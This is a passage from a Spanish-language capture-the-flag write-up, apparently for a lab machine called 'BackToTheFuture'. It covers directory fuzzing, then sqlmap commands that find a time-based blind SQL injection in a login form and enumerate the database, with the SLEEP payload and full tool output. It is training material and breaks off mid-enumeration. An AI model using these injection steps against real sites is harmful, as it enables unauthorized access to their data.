</span></span><span class=line><span class=cl>admin.php               <span class=o>[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms<span class=o>]</span>
</span></span><span class=line><span class=cl>css                     <span class=o>[</span>Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms<span class=o>]</span>
</span></span><span class=line><span class=cl>js                      <span class=o>[</span>Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms<span class=o>]</span>
</span></span><span class=line><span class=cl>logout.php              <span class=o>[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms<span class=o>]</span>
</span></span><span class=line><span class=cl>config.php              <span class=o>[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms<span class=o>]</span>
</span></span><span class=line><span class=cl>logs.php                <span class=o>[</span>Status: 200, Size: 216, Words: 22, Lines: 6, Duration: 0ms<span class=o>]</span>
</span></span><span class=line><span class=cl>.php                    <span class=o>[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms<span class=o>]</span>
</span></span><span class=line><span class=cl>.html                   <span class=o>[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms<span class=o>]</span>
</span></span><span class=line><span class=cl>                        <span class=o>[</span>Status: 200, Size: 2948, Words: 656, Lines: 69, Duration: 6ms<span class=o>]</span>
</span></span><span class=line><span class=cl>server-status           <span class=o>[</span>Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms<span class=o>]</span>
</span></span><span class=line><span class=cl>time_machine.php        <span class=o>[</span>Status: 200, Size: 1121, Words: 134, Lines: 29, Duration: 10ms<span class=o>]</span></span></span></code></pre></div></figure></div><p>Vemos que hay varios archivos, vamos a ir viendolos:</p><nav><div class="nav nav-tabs" id=nav-tab role=tablist><button data-toggle-tab=about.php class="nav-link active" id=tabs-create-new-site-0-tab data-bs-toggle=tab data-bs-target=#tabs-create-new-site-0 type=button role=tab aria-controls=tabs-create-new-site-0 aria-selected=true>
about.php</button>
<button data-toggle-tab=logs.php class=nav-link id=tabs-create-new-site-1-tab data-bs-toggle=tab data-bs-target=#tabs-create-new-site-1 type=button role=tab aria-controls=tabs-create-new-site-1 aria-selected=true>
logs.php</button></div></nav><div class=tab-content id=nav-tabContent><div data-pane=about.php class="tab-pane fade show active" id=tabs-create-new-site-0 role=tabpanel aria-labelledby=tabs-create-new-site-0-tab tabindex=0><figure><img srcset="data:image/webp;base64,UklGRiYAAABXRUJQVlA4IBoAAAAwAQCdASoQAAQAAph8J6QAA3AA/u/v/S4gAA==" data-srcset="/images/thl/backtothefuture/2_hu806e8801029a5e89add07d69d08abc29_26116_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/2_hu806e8801029a5e89add07d69d08abc29_26116_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/2_hu806e8801029a5e89add07d69d08abc29_26116_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/2_hu806e8801029a5e89add07d69d08abc29_26116_804x0_resize_q85_h2_lanczos_3.webp 804w" data-sizes=auto src=/images/thl/backtothefuture/2_hu806e8801029a5e89add07d69d08abc29_26116_480x0_resize_q85_bgffffff_lanczos_3.jpg width=804 height=225 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que no hay gran cosa, nos habla con que fin fue creada esta aplicación web.</p></div><div data-pane=logs.php class="tab-pane fade" id=tabs-create-new-site-1 role=tabpanel aria-labelledby=tabs-create-new-site-1-tab tabindex=0><figure><img srcset=data:image/webp;base64,UklGRi4AAABXRUJQVlA4ICIAAACwAQCdASoQAAYAAph8J6QAAu19bBHAAP7qvUzkSIYSLgAA data-srcset="/images/thl/backtothefuture/3_huad9d09231621ff2788c3e65331ea8fa4_23639_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/3_huad9d09231621ff2788c3e65331ea8fa4_23639_548x0_resize_q85_h2_lanczos_3.webp 548w" data-sizes=auto src=/images/thl/backtothefuture/3_huad9d09231621ff2788c3e65331ea8fa4_23639_480x0_resize_q85_bgffffff_lanczos_3.jpg width=548 height=201 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos unos logs, donde lo siguiente me llama la atención:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><pre tabindex=0><code>[ERROR] 1985-10-26 01:21: Backup fallido: permiso denegado
[INFO]  1985-10-25 23:59: Modificado archivo config.php</code></pre></figure></div><p>Nos guardaremos está información si no encontramos nada por el login.</p></div></div><h2 id=shell-as-www-data>Shell as www-data<a href=#shell-as-www-data class=anchor aria-hidden=true>#</a></h2><p>Vamos a ver si el login es vulnerable a un <code>SQLi</code> para ello lo detectaremos de la siguiente manera:</p><ol><li>Interceptaremos la consulta con BurpSuite y la enviaremos al <code>Repeater</code>:</li></ol><figure><img srcset="data:image/webp;base64,UklGRiwAAABXRUJQVlA4ICAAAACQAQCdASoQAAwAAph8J6QAApz7FAAA/tn4wwQ7G5sAAA==" data-srcset="/images/thl/backtothefuture/4_hu2c461e20c8aea81018b839dc4b4a42f0_72492_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/4_hu2c461e20c8aea81018b839dc4b4a42f0_72492_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/4_hu2c461e20c8aea81018b839dc4b4a42f0_72492_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/4_hu2c461e20c8aea81018b839dc4b4a42f0_72492_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/4_hu2c461e20c8aea81018b839dc4b4a42f0_72492_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/4_hu2c461e20c8aea81018b839dc4b4a42f0_72492_1207x0_resize_q85_h2_lanczos_3.webp 1207w" data-sizes=auto src=/images/thl/backtothefuture/4_hu2c461e20c8aea81018b839dc4b4a42f0_72492_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1207 height=942 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><figure><img srcset=data:image/webp;base64,UklGRigAAABXRUJQVlA4IBwAAAAwAQCdASoQAAcAAph8J6QAA3AA/u4RlUbEAAAA data-srcset="/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_1493x0_resize_q85_h2_lanczos_3.webp 1493w" data-sizes=auto src=/images/thl/backtothefuture/5_hue643de7a17c7fb4e936ddf31f8db34b5_62915_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1493 height=614 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><ol start=2><li>Vamos a probar en el campo <code>username</code> a añadir una comilla simple, si esto está mal sanitizado por detrás lo que ocurrirá es un fallo en la consulta devolviendo un error o un código de estádo 500 <em>(Internal Server Error)</em>:</li></ol><figure><img srcset="data:image/webp;base64,UklGRiYAAABXRUJQVlA4IBoAAAAwAQCdASoQAAYABJh8J6QAA3AA/u3cfYAAAA==" data-srcset="/images/thl/backtothefuture/6_hu9328c82c6960918f2e9919db6e1abca8_73197_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/6_hu9328c82c6960918f2e9919db6e1abca8_73197_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/6_hu9328c82c6960918f2e9919db6e1abca8_73197_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/6_hu9328c82c6960918f2e9919db6e1abca8_73197_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/6_hu9328c82c6960918f2e9919db6e1abca8_73197_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/6_hu9328c82c6960918f2e9919db6e1abca8_73197_1255x0_resize_q85_h2_lanczos_3.webp 1255w" data-sizes=auto src=/images/thl/backtothefuture/6_hu9328c82c6960918f2e9919db6e1abca8_73197_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1255 height=484 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Esto nos da una buena señal, ya que estamos ocasionando un error en la consulta. Ahora vamos a emplear <code>sqlmap</code> para ver ante que posible tipo de SQLi nos podriamos estar enfrentando:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sqlmap -u <span class=s2>&#34;http://hillvalley.thl/&#34;</span> --data<span class=o>=</span><span class=s2>&#34;username=test&amp;password=test&#34;</span> --batch
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[)]</span>_____ ___ ___  <span class=o>{</span>1.9.6#stable<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ -<span class=p>|</span> . <span class=o>[(]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [)]_|_|_|__,|  _|
</span></span></span><span class=line><span class=cl><span class=s1>      |_|V...       |_|   https://sqlmap.org
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=k>for</span> any misuse or damage caused by this program
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> starting @ 15:47:32 /2025-07-20/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>15:47:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resuming back-end DBMS <span class=s1>&#39;mysql&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:47:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
</span></span><span class=line><span class=cl><span class=o>[</span>15:47:32<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> potential permission problems detected <span class=o>(</span><span class=s1>&#39;Access denied&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>you have not declared cookie<span class=o>(</span>s<span class=o>)</span>, <span class=k>while</span> server wants to <span class=nb>set</span> its own <span class=o>(</span><span class=s1>&#39;PHPSESSID=bj2l9mr4c4l...ulr9f6h11u&#39;</span><span class=o>)</span>. Do you want to use those <span class=o>[</span>Y/n<span class=o>]</span> Y
</span></span><span class=line><span class=cl>sqlmap resumed the following injection point<span class=o>(</span>s<span class=o>)</span> from stored session:
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl>Parameter: username <span class=o>(</span>POST<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>username</span><span class=o>=</span>test<span class=s1>&#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND &#39;</span>YLkb<span class=s1>&#39;=&#39;</span>YLkb<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span><span class=nb>test</span>
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl><span class=o>[</span>15:47:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
</span></span><span class=line><span class=cl>web server operating system: Linux Debian
</span></span><span class=line><span class=cl>web application technology: Apache 2.4.62, PHP
</span></span><span class=line><span class=cl>back-end DBMS: MySQL &gt;<span class=o>=</span> 5.0.12 <span class=o>(</span>MariaDB fork<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:47:32<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetched data logged to text files under <span class=s1>&#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 15:47:32 /2025-07-20/</span></span></code></pre></div></figure></div><p>Vemos que estamos ante un Blind SQLi Time Based. Vamos a enumerar las bases de datos con <code>sqlmap</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sqlmap -u <span class=s2>&#34;http://hillvalley.thl/&#34;</span> --data<span class=o>=</span><span class=s2>&#34;username=test&amp;password=test&#34;</span> --dbs --batch
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[</span><span class=s2>&#34;]_____ ___ ___  {1.9.6#stable}
</span></span></span><span class=line><span class=cl><span class=s2>|_ -| . [&#34;</span><span class=o>]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [(]_|_|_|__,|  _|
</span></span></span><span class=line><span class=cl><span class=s1>      |_|V...       |_|   https://sqlmap.org
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=k>for</span> any misuse or damage caused by this program
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> starting @ 15:49:12 /2025-07-20/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resuming back-end DBMS <span class=s1>&#39;mysql&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> potential permission problems detected <span class=o>(</span><span class=s1>&#39;Access denied&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>you have not declared cookie<span class=o>(</span>s<span class=o>)</span>, <span class=k>while</span> server wants to <span class=nb>set</span> its own <span class=o>(</span><span class=s1>&#39;PHPSESSID=5vche9cjoeb...qucaibmv4r&#39;</span><span class=o>)</span>. Do you want to use those <span class=o>[</span>Y/n<span class=o>]</span> Y
</span></span><span class=line><span class=cl>sqlmap resumed the following injection point<span class=o>(</span>s<span class=o>)</span> from stored session:
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl>Parameter: username <span class=o>(</span>POST<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>username</span><span class=o>=</span>test<span class=s1>&#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND &#39;</span>YLkb<span class=s1>&#39;=&#39;</span>YLkb<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span><span class=nb>test</span>
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
</span></span><span class=line><span class=cl>web server operating system: Linux Debian
</span></span><span class=line><span class=cl>web application technology: PHP, Apache 2.4.62
</span></span><span class=line><span class=cl>back-end DBMS: MySQL &gt;<span class=o>=</span> 5.0.12 <span class=o>(</span>MariaDB fork<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetching database names
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetching number of databases
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> time-based comparison requires larger statistical model, please wait.............................. <span class=o>(</span><span class=k>done</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:12<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
</span></span><span class=line><span class=cl><span class=k>do</span> you want sqlmap to try to optimize value<span class=o>(</span>s<span class=o>)</span> <span class=k>for</span> DBMS delay responses <span class=o>(</span>option <span class=s1>&#39;--time-sec&#39;</span><span class=o>)</span>? <span class=o>[</span>Y/n<span class=o>]</span> Y
</span></span><span class=line><span class=cl><span class=m>2</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:22<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved:
</span></span><span class=line><span class=cl><span class=o>[</span>15:49:27<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> adjusting <span class=nb>time</span> delay to <span class=m>1</span> second due to good response <span class=nb>times</span>
</span></span><span class=line><span class=cl>information_schema
</span></span><span class=line><span class=cl><span class=o>[</span>15:50:24<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: hillvalley
</span></span><span class=line><span class=cl>available databases <span class=o>[</span>2<span class=o>]</span>:
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> hillvalley
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> information_schema
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>15:50:57<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetched data logged to text files under <span class=s1>&#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 15:50:57 /2025-07-20/</span></span></code></pre></div></figure></div><div class="callout callout-caution d-flex flex-row mt-4 mb-4 pt-4 pe-4 pb-2 ps-3"><svg class="outline/alert-triangle svg-inline callout-icon me-2 mb-3" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 9v4"/><path d="M10.363 3.591 2.257 17.125a1.914 1.914.0 001.636 2.871h16.214a1.914 1.914.0 001.636-2.87L13.637 3.59a1.914 1.914.0 00-3.274.0z"/><path d="M12 16h.01"/></svg><div class=callout-content><div class=callout-title><p>Aviso</p></div><div class=callout-body><p>Puede tardar un rato en enumerarnos todas las bases de datos ya que al ser basada en tiempo tiene que ir letra en letra, solo debemos esperar.</p></div></div></div><p>Vemos la base de datos <code>hillvalley</code>, ahora con el parametro <code>-D</code> indicaremos esa base de datos y enumeraremos las tablas:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sqlmap -u <span class=s2>&#34;http://hillvalley.thl/&#34;</span> --data<span class=o>=</span><span class=s2>&#34;username=test&amp;password=test&#34;</span> -D <span class=s2>&#34;hillvalley&#34;</span> --tables --batch
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[(]</span>_____ ___ ___  <span class=o>{</span>1.9.6#stable<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ -<span class=p>|</span> . <span class=o>[)]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [&#39;</span><span class=o>]</span>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>__,<span class=p>|</span>  _<span class=p>|</span>
</span></span><span class=line><span class=cl>      <span class=p>|</span>_<span class=p>|</span>V...       <span class=p>|</span>_<span class=p>|</span>   https://sqlmap.org
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> legal disclaimer: Usage of sqlmap <span class=k>for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[*] starting @ 15:52:47 /2025-07-20/
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [INFO] resuming back-end DBMS &#39;</span>mysql<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [INFO] testing connection to the target URL
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [WARNING] potential permission problems detected (&#39;</span>Access denied<span class=s1>&#39;)
</span></span></span><span class=line><span class=cl><span class=s1>you have not declared cookie(s), while server wants to set its own (&#39;</span><span class=nv>PHPSESSID</span><span class=o>=</span>hld44ufvdvp...9fjji60r01<span class=s1>&#39;). Do you want to use those [Y/n] Y
</span></span></span><span class=line><span class=cl><span class=s1>sqlmap resumed the following injection point(s) from stored session:
</span></span></span><span class=line><span class=cl><span class=s1>---
</span></span></span><span class=line><span class=cl><span class=s1>Parameter: username (POST)
</span></span></span><span class=line><span class=cl><span class=s1>    Type: time-based blind
</span></span></span><span class=line><span class=cl><span class=s1>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span></span><span class=line><span class=cl><span class=s1>    Payload: username=test&#39;</span> AND <span class=o>(</span>SELECT <span class=m>9578</span> FROM <span class=o>(</span>SELECT<span class=o>(</span>SLEEP<span class=o>(</span>5<span class=o>)))</span>ctfH<span class=o>)</span> AND <span class=s1>&#39;YLkb&#39;</span><span class=o>=</span><span class=s1>&#39;YLkb&amp;password=test
</span></span></span><span class=line><span class=cl><span class=s1>---
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [INFO] the back-end DBMS is MySQL
</span></span></span><span class=line><span class=cl><span class=s1>web server operating system: Linux Debian
</span></span></span><span class=line><span class=cl><span class=s1>web application technology: Apache 2.4.62, PHP
</span></span></span><span class=line><span class=cl><span class=s1>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [INFO] fetching tables for database: &#39;</span>hillvalley<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [INFO] fetching number of tables for database &#39;</span>hillvalley<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:47] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
</span></span></span><span class=line><span class=cl><span class=s1>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;</span>--time-sec<span class=s1>&#39;)? [Y/n] Y
</span></span></span><span class=line><span class=cl><span class=s1>1
</span></span></span><span class=line><span class=cl><span class=s1>[15:52:52] [INFO] retrieved:
</span></span></span><span class=line><span class=cl><span class=s1>[15:53:02] [INFO] adjusting time delay to 1 second due to good response times
</span></span></span><span class=line><span class=cl><span class=s1>users
</span></span></span><span class=line><span class=cl><span class=s1>Database: hillvalley
</span></span></span><span class=line><span class=cl><span class=s1>[1 table]
</span></span></span><span class=line><span class=cl><span class=s1>+-------+
</span></span></span><span class=line><span class=cl><span class=s1>| users |
</span></span></span><span class=line><span class=cl><span class=s1>+-------+
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[15:53:15] [INFO] fetched data logged to text files under &#39;</span>/home/pylon/.local/share/sqlmap/output/hillvalley.thl<span class=err>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 15:53:15 /2025-07-20/</span></span></code></pre></div></figure></div><p>Ya tenemos la tabla!! Ahora vamos a enumerar las columnas. Indicaremos la tabla encontrada con <code>-T</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sqlmap -u <span class=s2>&#34;http://hillvalley.thl/&#34;</span> --data<span class=o>=</span><span class=s2>&#34;username=test&amp;password=test&#34;</span> -D <span class=s2>&#34;hillvalley&#34;</span> -T <span class=s2>&#34;users&#34;</span> --columns --batch
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[)]</span>_____ ___ ___  <span class=o>{</span>1.9.6#stable<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ -<span class=p>|</span> . <span class=o>[(]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [&#39;</span><span class=o>]</span>_<span class=p>|</span>_<span class=p>|</span>_<span class=p>|</span>__,<span class=p>|</span>  _<span class=p>|</span>
</span></span><span class=line><span class=cl>      <span class=p>|</span>_<span class=p>|</span>V...       <span class=p>|</span>_<span class=p>|</span>   https://sqlmap.org
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> legal disclaimer: Usage of sqlmap <span class=k>for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=s1>&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[*] starting @ 15:54:50 /2025-07-20/
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[15:54:50] [INFO] resuming back-end DBMS &#39;</span>mysql<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>[15:54:50] [INFO] testing connection to the target URL
</span></span></span><span class=line><span class=cl><span class=s1>[15:54:50] [WARNING] potential permission problems detected (&#39;</span>Access denied<span class=s1>&#39;)
</span></span></span><span class=line><span class=cl><span class=s1>you have not declared cookie(s), while server wants to set its own (&#39;</span><span class=nv>PHPSESSID</span><span class=o>=</span>eanuvdsvr7p...8te4c584d9<span class=s1>&#39;). Do you want to use those [Y/n] Y
</span></span></span><span class=line><span class=cl><span class=s1>sqlmap resumed the following injection point(s) from stored session:
</span></span></span><span class=line><span class=cl><span class=s1>---
</span></span></span><span class=line><span class=cl><span class=s1>Parameter: username (POST)
</span></span></span><span class=line><span class=cl><span class=s1>    Type: time-based blind
</span></span></span><span class=line><span class=cl><span class=s1>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span></span><span class=line><span class=cl><span class=s1>    Payload: username=test&#39;</span> AND <span class=o>(</span>SELECT <span class=m>9578</span> FROM <span class=o>(</span>SELECT<span class=o>(</span>SLEEP<span class=o>(</span>5<span class=o>)))</span>ctfH<span class=o>)</span> AND <span class=s1>&#39;YLkb&#39;</span><span class=o>=</span><span class=s1>&#39;YLkb&amp;password=test
</span></span></span><span class=line><span class=cl><span class=s1>---
</span></span></span><span class=line><span class=cl><span class=s1>[15:54:50] [INFO] the back-end DBMS is MySQL
</span></span></span><span class=line><span class=cl><span class=s1>web server operating system: Linux Debian
</span></span></span><span class=line><span class=cl><span class=s1>web application technology: PHP, Apache 2.4.62
</span></span></span><span class=line><span class=cl><span class=s1>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
</span></span></span><span class=line><span class=cl><span class=s1>[15:54:50] [INFO] fetching columns for table &#39;</span>users<span class=s1>&#39; in database &#39;</span>hillvalley<span class=s1>&#39;
